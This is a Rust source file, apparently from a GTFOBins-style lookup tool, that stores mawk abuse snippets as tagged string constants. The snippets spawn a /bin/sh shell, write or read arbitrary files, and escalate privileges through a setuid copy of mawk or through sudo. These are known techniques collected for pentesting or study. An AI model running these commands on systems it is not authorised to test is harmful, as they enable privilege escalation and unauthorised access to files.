pub static BIN_NAME: &'static str = "mawk";
pub static SH_CODE: &'static str = r#"
    
    mawk 'BEGIN {system("/bin/sh")}'
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    mawk '//' "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which mawk) .

    LFILE=file_to_read
    ./mawk '//' "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo mawk 'BEGIN {system("/bin/sh")}'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which mawk) .

    ./mawk 'BEGIN {system("/bin/sh")}'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
